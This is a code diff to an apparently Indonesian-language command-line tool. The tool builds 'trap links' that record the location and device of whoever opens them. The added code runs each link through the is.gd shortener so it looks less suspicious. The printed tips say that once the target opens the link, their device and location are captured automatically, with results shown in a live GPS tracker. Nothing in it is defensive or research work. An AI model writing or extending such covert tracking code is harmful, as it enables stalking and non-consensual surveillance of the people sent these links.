@@ -122,11 +122,20 @@ async function handleLinkLogger() {
 
     // Fallback if they run in localhost / CLI without Web
     const trapLink = `https://sintel.neoma.space/api/trap?topic=${topicId}&t=${tBase}`;
+    let shortLink = trapLink;
+
+    const spinner = ora('Membuat link jebakan pendek...').start();
+    try {
+        const axios = require('axios');
+        const res = await axios.get(`https://is.gd/create.php?format=json&url=${encodeURIComponent(trapLink)}`);
+        if (res.data && res.data.shorturl) shortLink = res.data.shorturl;
+    } catch (e) { }
+    spinner.stop();
 
     printSuccess('Link Pelacakan Berhasil Dibuat (REAL)!');
-    console.log(`\n🕸️ Link Jebakan: ${chalk.green.bold.underline(trapLink)}`);
+    console.log(`\n🕸️ Link Jebakan: ${chalk.green.bold.underline(shortLink)}`);
     console.log(`⏱️ Cek Hasil Klik Di: ${chalk.blue.underline('Buka Web SINTEL-HP lu di Vercel, masuk ke Menu Live GPS Tracker')}`);
-    console.log(chalk.dim('\nTips: Kalau dirasa mencurigakan, pendekin di bit.ly atau s.id. Selama target buka browser hapenya, lokasi auto-kirim!'));
+    console.log(chalk.dim('\nTips: Selama target buka shortlink, perangkat & lokasi dia auto-kerekam!'));
 
     main();
 }
